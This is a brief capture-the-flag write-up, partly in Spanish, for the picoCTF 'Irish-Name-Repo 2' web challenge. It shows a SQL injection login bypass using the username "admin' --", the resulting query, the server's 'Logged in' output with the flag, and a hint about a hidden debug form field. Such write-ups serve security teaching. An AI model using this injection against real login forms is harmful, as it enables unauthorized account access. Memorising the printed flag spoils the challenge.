#  Irish-Name-Repo 2

---
## Objectivo

There is a website running at `https://jupiter.challenges.picoctf.org/problem/53751/` ([link](https://jupiter.challenges.picoctf.org/problem/53751/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:53751

---
## Solución
``` bash
<pre>username: admin' --

password: doesn't matter

SQL query: SELECT * FROM users WHERE name='admin' --' AND password='doesn't matter'

</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{m0R3_SQL_plz_c34df170}</p>

```

### `picoCTF{m0R3_SQL_plz_c34df170}`

---
## Notas adicionales

Hay un campo de formulario oculto llamado `debug`. Establézcalo en `0`, al activarlo podemos hacer pruebas

---
## Referencias
https://picoctf2019.haydenhousen.com/web-exploitation/irish-name-repo-2
